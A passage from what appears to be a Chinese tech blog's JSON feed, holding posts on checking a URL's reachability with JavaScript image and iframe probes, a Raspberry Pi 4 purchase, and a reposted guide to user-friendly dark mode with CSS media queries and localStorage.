分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 